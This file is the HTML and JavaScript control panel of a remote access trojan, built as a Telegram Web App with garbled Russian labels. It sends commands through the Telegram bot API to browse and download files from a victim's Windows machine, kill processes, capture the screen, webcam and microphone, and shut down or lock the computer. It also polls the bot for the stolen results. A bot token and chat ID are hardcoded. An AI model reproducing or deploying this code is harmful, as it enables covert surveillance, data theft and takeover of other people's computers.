<!DOCTYPE html>
<html>
<head>
    <title>RAT Control</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: Arial; padding: 16px; background: #f5f5f5; }
        .header { background: #0088cc; color: white; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
        .card { background: white; border-radius: 10px; padding: 16px; margin-bottom: 16px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        button { background: #0088cc; color: white; border: none; border-radius: 8px; padding: 12px; margin: 4px; width: 100%; font-size: 16px; }
        .output { background: #f0f0f0; padding: 12px; border-radius: 8px; margin-top: 12px; white-space: pre-wrap; max-height: 300px; overflow-y: auto; }
        .path { background: #e0e0e0; padding: 8px; border-radius: 5px; margin: 10px 0; font-family: monospace; }
        input { width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #ddd; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="header">
        <h1>ğŸ¤– RAT CONTROL</h1>
        <p>Ğ£Ğ¿Ñ€Ğ°Ğ²Ğ»ĞµĞ½Ğ¸Ğµ ĞºĞ¾Ğ¼Ğ¿ÑŒÑÑ‚ĞµÑ€Ğ¾Ğ¼</p>
    </div>

    <div id="status" style="text-align: center; padding: 10px; color: #666;">Ğ“Ğ¾Ñ‚Ğ¾Ğ² Ğº Ñ€Ğ°Ğ±Ğ¾Ñ‚Ğµ</div>

    <!-- Ğ˜Ğ½Ñ„Ğ¾Ñ€Ğ¼Ğ°Ñ†Ğ¸Ñ Ğ¾ ÑĞ¸ÑÑ‚ĞµĞ¼Ğµ -->
    <div class="card">
        <h3>ğŸ“Š Ğ¡Ğ˜Ğ¡Ğ¢Ğ•ĞœĞ</h3>
        <button onclick="httpRequest('system_info')">ğŸ”„ Ğ˜Ğ½Ñ„Ğ¾Ñ€Ğ¼Ğ°Ñ†Ğ¸Ñ</button>
        <button onclick="httpRequest('cpu_info')">âš™ï¸ CPU</button>
        <button onclick="httpRequest('ram_info')">ğŸ’¾ RAM</button>
        <button onclick="httpRequest('disk_info')">ğŸ’¿ Ğ”Ğ¸ÑĞº</button>
        <div id="systemOutput" class="output"></div>
    </div>

    <!-- Ğ¤Ğ°Ğ¹Ğ»Ñ‹ -->
    <div class="card">
        <h3>ğŸ“ Ğ¤ĞĞ™Ğ›Ğ«</h3>
        <div class="path" id="currentPath">C:\</div>
        <button onclick="httpRequest('list_files', { path: currentDir })">ğŸ“‹ Ğ¡Ğ¿Ğ¸ÑĞ¾Ğº</button>
        <button onclick="httpRequest('go_back', { path: currentDir })">â¬†ï¸ ĞĞ°Ğ·Ğ°Ğ´</button>
        
        <input type="text" id="folderPath" placeholder="ĞŸÑƒÑ‚ÑŒ Ğº Ğ¿Ğ°Ğ¿ĞºĞµ">
        <button onclick="changeDir()">ĞŸĞµÑ€ĞµĞ¹Ñ‚Ğ¸</button>
        
        <input type="text" id="fileName" placeholder="Ğ˜Ğ¼Ñ Ñ„Ğ°Ğ¹Ğ»Ğ°">
        <button onclick="downloadFile()">ğŸ“¥ Ğ¡ĞºĞ°Ñ‡Ğ°Ñ‚ÑŒ</button>
        
        <div id="fileOutput" class="output"></div>
    </div>

    <!-- ĞŸÑ€Ğ¾Ñ†ĞµÑÑÑ‹ -->
    <div class="card">
        <h3>ğŸ“‹ ĞŸĞ ĞĞ¦Ğ•Ğ¡Ğ¡Ğ«</h3>
        <button onclick="httpRequest('processes')">ğŸ“Š Ğ’ÑĞµ</button>
        <button onclick="httpRequest('top_cpu')">âš¡ ĞŸĞ¾ CPU</button>
        <button onclick="httpRequest('top_ram')">ğŸ’¾ ĞŸĞ¾ RAM</button>
        
        <input type="number" id="pid" placeholder="PID">
        <button onclick="killProcess()">ğŸ”ª Ğ£Ğ±Ğ¸Ñ‚ÑŒ</button>
        
        <div id="processOutput" class="output"></div>
    </div>

    <!-- ĞœĞµĞ´Ğ¸Ğ° Ğ¸ ÑƒĞ¿Ñ€Ğ°Ğ²Ğ»ĞµĞ½Ğ¸Ğµ -->
    <div class="card">
        <h3>ğŸ¥ ĞœĞ•Ğ”Ğ˜Ğ</h3>
        <button onclick="httpMedia('screen')">ğŸ“¸ Ğ¡ĞºÑ€Ğ¸Ğ½ÑˆĞ¾Ñ‚</button>
        <button onclick="httpMedia('webcam')">ğŸ“· Ğ’ĞµĞ±ĞºĞ°Ğ¼ĞµÑ€Ğ°</button>
        <button onclick="httpMedia('mic')">ğŸ¤ ĞœĞ¸ĞºÑ€Ğ¾Ñ„Ğ¾Ğ½</button>
    </div>

    <div class="card">
        <h3>âš¡ Ğ£ĞŸĞ ĞĞ’Ğ›Ğ•ĞĞ˜Ğ•</h3>
        <button onclick="httpCommand('restart')">ğŸ”„ ĞŸĞµÑ€ĞµĞ·Ğ°Ğ³Ñ€ÑƒĞ·ĞºĞ°</button>
        <button onclick="httpCommand('shutdown')">â» Ğ’Ñ‹ĞºĞ»ÑÑ‡ĞµĞ½Ğ¸Ğµ</button>
        <button onclick="httpCommand('lock')">ğŸ”’ Ğ‘Ğ»Ğ¾ĞºĞ¸Ñ€Ğ¾Ğ²ĞºĞ°</button>
        <button onclick="httpCommand('sleep')">ğŸ˜´ Ğ¡Ğ¾Ğ½</button>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        
        // ĞŸĞ¾Ğ»ÑƒÑ‡Ğ°ĞµĞ¼ Ğ´Ğ°Ğ½Ğ½Ñ‹Ğµ Ğ¸Ğ½Ğ¸Ñ†Ğ¸Ğ°Ğ»Ğ¸Ğ·Ğ°Ñ†Ğ¸Ğ¸ Ğ´Ğ»Ñ Ğ°ÑƒÑ‚ĞµĞ½Ñ‚Ğ¸Ñ„Ğ¸ĞºĞ°Ñ†Ğ¸Ğ¸ [citation:6]
        const initData = tg.initData;
        const initDataUnsafe = tg.initDataUnsafe;
        const userId = initDataUnsafe?.user?.id;
        
        let currentDir = 'C:\\';
        const BOT_TOKEN = '8417099264:AAHZ_xx4NfBLs04BoGyutO0_dwaa66b-ECo';
        
        // âš¡ HTTP Ğ·Ğ°Ğ¿Ñ€Ğ¾ÑÑ‹ - Ğ¿Ñ€Ğ¸Ğ»Ğ¾Ğ¶ĞµĞ½Ğ¸Ğµ ĞĞ• Ğ·Ğ°ĞºÑ€Ñ‹Ğ²Ğ°ĞµÑ‚ÑÑ!
        async function httpRequest(action, params = {}) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            
            const message = {
                chat_id: userId || 7266658879, // Ğ’Ğ°Ñˆ ID ĞºĞ°Ğº fallback
                text: JSON.stringify({
                    action: action,
                    params: params,
                    from_webapp: true
                })
            };
            
            updateStatus('â³ ĞÑ‚Ğ¿Ñ€Ğ°Ğ²ĞºĞ°...');
            
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(message)
                });
                
                const data = await response.json();
                if (data.ok) {
                    updateStatus('âœ… Ğ—Ğ°Ğ¿Ñ€Ğ¾Ñ Ğ¾Ñ‚Ğ¿Ñ€Ğ°Ğ²Ğ»ĞµĞ½');
                } else {
                    updateStatus('âŒ ĞÑˆĞ¸Ğ±ĞºĞ°');
                }
                return data;
            } catch (error) {
                updateStatus('âŒ ' + error.message);
            }
        }
        
        // Ğ¤ÑƒĞ½ĞºÑ†Ğ¸Ğ¸ Ğ´Ğ»Ñ Ñ€Ğ°Ğ·Ğ½Ñ‹Ñ… Ñ‚Ğ¸Ğ¿Ğ¾Ğ² Ğ·Ğ°Ğ¿Ñ€Ğ¾ÑĞ¾Ğ²
        function changeDir() {
            const path = document.getElementById('folderPath').value;
            if (path) {
                httpRequest('change_dir', { current: currentDir, path: path });
                document.getElementById('folderPath').value = '';
            }
        }
        
        function downloadFile() {
            const name = document.getElementById('fileName').value;
            if (name) {
                httpRequest('get', { path: currentDir + '\\' + name });
            }
        }
        
        function killProcess() {
            const pid = document.getElementById('pid').value;
            if (pid) {
                httpRequest('kill_process', { pid: parseInt(pid) });
            }
        }
        
        function httpMedia(type) {
            httpRequest(type);
        }
        
        function httpCommand(cmd) {
            httpRequest(cmd);
        }
        
        function updateStatus(text) {
            document.getElementById('status').textContent = text;
        }
        
        // ĞŸĞ¾Ğ»ÑƒÑ‡Ğ°ĞµĞ¼ Ğ¿Ğ¾ÑĞ»ĞµĞ´Ğ½Ğ¸Ğµ 100 ÑĞ¾Ğ¾Ğ±Ñ‰ĞµĞ½Ğ¸Ğ¹ Ğ´Ğ»Ñ Ğ¾Ñ‚Ğ¾Ğ±Ñ€Ğ°Ğ¶ĞµĞ½Ğ¸Ñ Ñ€ĞµĞ·ÑƒĞ»ÑŒÑ‚Ğ°Ñ‚Ğ¾Ğ²
        async function getUpdates() {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`;
            
            try {
                const response = await fetch(url);
                const data = await response.json();
                
                if (data.ok && data.result.length > 0) {
                    const lastMessages = data.result.slice(-10).reverse();
                    
                    lastMessages.forEach(msg => {
                        if (msg.message?.text?.startsWith('{')) {
                            try {
                                const responseData = JSON.parse(msg.message.text);
                                
                                // ĞÑ‚Ğ¾Ğ±Ñ€Ğ°Ğ¶Ğ°ĞµĞ¼ Ğ´Ğ°Ğ½Ğ½Ñ‹Ğµ Ğ² Ğ·Ğ°Ğ²Ğ¸ÑĞ¸Ğ¼Ğ¾ÑÑ‚Ğ¸ Ğ¾Ñ‚ Ñ‚Ğ¸Ğ¿Ğ°
                                if (responseData.files) {
                                    displayFiles(responseData);
                                } else if (responseData.processes) {
                                    document.getElementById('processOutput').innerHTML = 
                                        formatProcesses(responseData.processes);
                                } else if (responseData.system) {
                                    document.getElementById('systemOutput').innerHTML = 
                                        JSON.stringify(responseData, null, 2);
                                }
                            } catch (e) {}
                        }
                    });
                }
            } catch (error) {
                console.error('ĞÑˆĞ¸Ğ±ĞºĞ° Ğ¿Ğ¾Ğ»ÑƒÑ‡ĞµĞ½Ğ¸Ñ Ğ¾Ğ±Ğ½Ğ¾Ğ²Ğ»ĞµĞ½Ğ¸Ğ¹:', error);
            }
        }
        
        function displayFiles(data) {
            if (data.current_dir) {
                currentDir = data.current_dir;
                document.getElementById('currentPath').textContent = currentDir;
            }
            
            if (data.files) {
                let html = '';
                data.files.slice(0, 20).forEach(f => {
                    const icon = f.is_dir ? 'ğŸ“' : 'ğŸ“„';
                    html += `<div style="padding: 4px; border-bottom: 1px solid #eee;">${icon} ${f.name} ${f.size || ''}</div>`;
                });
                document.getElementById('fileOutput').innerHTML = html;
            }
        }
        
        function formatProcesses(procs) {
            let html = '';
            procs.slice(0, 15).forEach(p => {
                html += `<div>ğŸ“Š ${p.pid} | ${p.name} | CPU:${p.cpu}% RAM:${p.ram}%</div>`;
            });
            return html;
        }
        
        // ĞŸÑ€Ğ¾Ğ²ĞµÑ€ÑĞµĞ¼ Ğ½Ğ¾Ğ²Ñ‹Ğµ ÑĞ¾Ğ¾Ğ±Ñ‰ĞµĞ½Ğ¸Ñ ĞºĞ°Ğ¶Ğ´Ñ‹Ğµ 3 ÑĞµĞºÑƒĞ½Ğ´Ñ‹
        setInterval(getUpdates, 3000);
        
        // ĞŸÑ€Ğ¸ Ğ·Ğ°Ğ³Ñ€ÑƒĞ·ĞºĞµ Ğ¿Ğ¾Ğ»ÑƒÑ‡Ğ°ĞµĞ¼ Ğ¿Ğ¾ÑĞ»ĞµĞ´Ğ½Ğ¸Ğµ Ğ´Ğ°Ğ½Ğ½Ñ‹Ğµ
        setTimeout(getUpdates, 1000);
    </script>
</body>
</html>
